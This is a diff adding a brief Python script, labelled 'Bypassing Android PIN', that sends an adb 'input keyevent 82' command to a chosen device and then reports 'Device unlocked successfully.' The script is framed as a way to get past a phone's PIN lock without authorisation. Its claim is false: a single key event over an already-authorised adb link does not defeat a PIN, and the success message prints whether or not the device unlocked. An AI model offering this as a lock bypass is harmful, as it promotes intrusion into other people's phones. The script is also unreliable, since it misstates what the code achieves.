@@ -1,0 +1,15 @@
+# Bypassing Android PIN
+import os
+import subprocess
+
+def bypass_android_pin(device_id):
+    try:
+        # Unlock the device
+        subprocess.run(["adb", "-s", device_id, "shell", "input", "keyevent", "82"], check=True)
+        print("Device unlocked successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    device_id = input("Enter the Android device ID: ")
+    bypass_android_pin(device_id)
